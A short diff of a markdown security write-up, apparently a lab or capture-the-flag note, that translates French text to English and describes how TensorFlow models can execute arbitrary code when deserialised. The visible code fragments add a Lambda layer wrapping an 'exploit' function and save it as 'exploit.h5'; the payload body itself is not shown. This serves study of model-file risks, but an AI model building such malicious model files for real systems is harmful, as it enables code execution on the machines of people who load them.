@@ -1,8 +1,8 @@
-We train IA using `.h5` file 
+We train AI using `.h5` file 
 
 ### TensorFlow
 
-TensorFlow permet de créer, entraîner et déployer facilement des modèles de ML qui peuvent s'exécuter dans n'importe quel environnement.
+TensorFlow makes it easy to create, train and deploy ML models that can run in any environment.
 
 TensorFlow models can execute arbitrary code during deserialization ([reference blog](https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model)).
 
@@ -20,4 +20,3 @@ model.add(tf.keras.layers.Lambda(exploit))
 model.compile()  
 model.save("exploit.h5")
 ```
-
